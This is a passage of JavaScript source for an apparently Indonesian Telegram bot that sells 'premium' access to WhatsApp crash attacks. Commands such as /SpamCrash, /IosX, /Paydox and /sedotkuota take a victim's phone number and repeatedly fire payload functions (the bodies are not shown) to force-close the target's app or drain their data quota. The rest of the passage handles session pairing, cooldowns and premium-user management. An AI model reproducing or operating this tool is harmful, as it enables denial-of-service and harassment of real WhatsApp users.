    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 40; i++) {
    await BlankVVIP(target);
    await sleep(250); 
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});

bot.onText(/\/LocationX (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 30; i++) {
    await protocolbug10(mention, target);
    await sleep(150);
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});

bot.onText(/\/SpamCrash (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 55; i++) {
    await JtwCrashUi(target);
    await sleep(200);
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});

bot.onText(/\/IosX (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 35; i++) {
    await VampireInvisIos(target);
    await sleep(300);
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});

bot.onText(/\/LocaOx (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 25; i++) {
    await ForcecloseNew(sock, target);
    await sleep(150);
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});

bot.onText(/\/Paydox (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 20; i++) {
    await paydox(target, Ptcp = true);
    await sleep(100);
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});

bot.onText(/\/sedotkuota (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const randomVideo = getRandomVideo();

  // Cek premium
  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: "```\nAccess Denied❗\n\nYou do not have premium access. Please refrain from using exclusive features.\n\nTo get full access, please contact the bot owner.\n```",
    parse_mode: "MarkdownV2",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Buy Premium Access", url: "https://t.me/ZexxOfficial" }],
        [
          { text: "Bot Owner", url: "https://t.me/ZexxOfficial" },
          { text: "Channel Info", url: "https://t.me/ZexxOfficial" }
        ]
      ]
    }
  });
}

  // Cek cooldown
  const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 1000)} detik sebelum bisa pakai command ini lagi.`);
}

  // Cek apakah ada session aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, "❌ Tidak ada bot WhatsApp yang aktif. Gunakan perintah /addpairing 62xxxxx.");
  }
  const sock = [...sessions.values()][0]; // Ambil salah satu session aktif

  try {
  const sentMessage = await bot.sendVideo(chatId, "https://files.catbox.moe/0v2zgm.mp4", {
    caption: `
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
  });

  const progressStages = [
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
    { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
  ];

  for (const stage of progressStages) {
    await new Promise(resolve => setTimeout(resolve, stage.delay));
    await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
  }

  console.log("\x1b[32m[PROSES MENGIRIM BUG]\x1b[0m");
for (let i = 0; i < 30; i++) {
    await jembutLebat(target);
    await sleep(300);
}
console.log("\x1b[32m[SUKSES]\x1b[0m Bug berhasil dikirim!");

  await bot.editMessageCaption(`
\`\`\`—ZexxOfficial
Olàa
──────────────────────────
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
    chat_id: chatId,
    message_id: sentMessage.message_id,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
    }
  });

} catch (error) {
  bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
}
});

//=======plugins=======//
bot.onText(/\/addpairing (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});



const moment = require('moment');

bot.onText(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - V I P \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

